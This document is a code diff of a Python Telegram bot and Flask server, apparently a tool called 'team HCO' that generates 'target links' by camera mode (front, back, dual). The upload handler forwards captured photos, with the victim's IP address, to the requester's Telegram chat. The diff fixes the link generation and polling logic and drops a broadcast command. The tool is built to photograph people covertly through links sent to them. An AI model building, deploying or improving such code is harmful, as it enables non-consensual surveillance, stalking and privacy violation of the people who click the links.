@@ -13,6 +13,7 @@ YT_CHANNEL = "https://youtube.com/@hackers_colony_tech?si=EXxJtogSUPc8Q4zM"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# Database Setup
 def init_db():
     conn = sqlite3.connect('users.db')
     conn.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
@@ -39,32 +40,35 @@ def start(message):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     user_id = call.message.chat.id
+    # Log for debugging
+    print(f"Callback received: {call.data} from {user_id}")
+    
     if call.data == "check_join":
         markup = types.InlineKeyboardMarkup()
         btn_front = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
         btn_back = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
         btn_dual = types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual")
         btn_support = types.InlineKeyboardButton("🧑‍💻 Contact Support", url=CONTACT_SUPPORT_LINK)
+        
         markup.row(btn_front, btn_back)
         markup.row(btn_dual)
         markup.row(btn_support)
+        
         bot.edit_message_text("<b>Select your camera mode:</b>", user_id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
-    elif "m_" in call.data:
+    elif call.data.startswith("m_"):
         mode = call.data.replace("m_", "")
-        link = f"{request.host_url.rstrip('/')}/?m={mode}&uid={user_id}"
-        bot.send_message(user_id, f"🤠 It's your target link 🔗 just send it your target 🎯\n\nUrl =( <code>{link}</code> )\n\n✨Thank you team HCO ✨", parse_mode='HTML')
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast(message):
-    if message.chat.id in ADMINS:
-        msg_text = message.text.replace('/broadcast ', '')
-        conn = sqlite3.connect('users.db')
-        users = conn.execute('SELECT user_id FROM users').fetchall()
-        conn.close()
-        for u in users:
-            try: bot.send_message(u[0], msg_text)
-            except: pass
+        # Get base URL from environment or fallback
+        base_url = "https://" + os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app-name.onrender.com')
+        link = f"{base_url}/?m={mode}&uid={user_id}"
+        
+        response_text = (
+            f"🤠 It's your target link 🔗 just send it your target 🎯\n\n"
+            f"Url =( <code>{link}</code> )\n\n"
+            f"✨Thank you team HCO ✨"
+        )
+        bot.answer_callback_query(call.id, "Link Generated!")
+        bot.send_message(user_id, response_text, parse_mode='HTML')
 
 @app.route('/')
 def index():
@@ -83,18 +87,24 @@ def upload():
                    f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                    f"✨ Created by Roshan Ali ✨")
         bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
-    except: pass
+    except Exception as e:
+        print(f"Upload error: {e}")
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     init_db()
     def run_bot():
-        time.sleep(12) 
+        # Step 1: Force stop webhooks to clear 409 error
+        bot.remove_webhook()
+        time.sleep(5) 
+        print("Bot is starting...")
         while True:
             try:
-                bot.remove_webhook()
-                bot.polling(none_stop=True, interval=5, timeout=60)
-            except: time.sleep(15)
+                bot.polling(none_stop=True, interval=2, timeout=60)
+            except Exception as e:
+                print(f"Polling error: {e}")
+                time.sleep(10)
+
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-        
+    
